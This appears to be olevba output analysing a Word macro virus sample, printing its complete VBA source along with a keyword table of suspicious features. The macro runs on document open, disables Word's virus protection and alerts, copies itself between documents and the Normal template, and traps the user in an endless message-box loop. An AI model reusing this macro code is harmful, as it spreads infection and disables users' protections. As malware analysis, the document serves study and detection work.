olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yozak.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yozak.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Dim ni As Boolean, ai As Boolean
If NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ni = True
If ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(3, 3) = "Options.VirusProtection = False" Then ai = True
x = VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 22)
If ni = True And ai = False Then
ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
ElseIf ni = False And ai = True Then
NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString x
End If
freevic:
MsgBox "Free Vic", vbCritical, "Stupid"
MsgBox "Free Vic Free Vic Free Vic"
MsgBox "Legalize VXing"
GoTo freevic
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

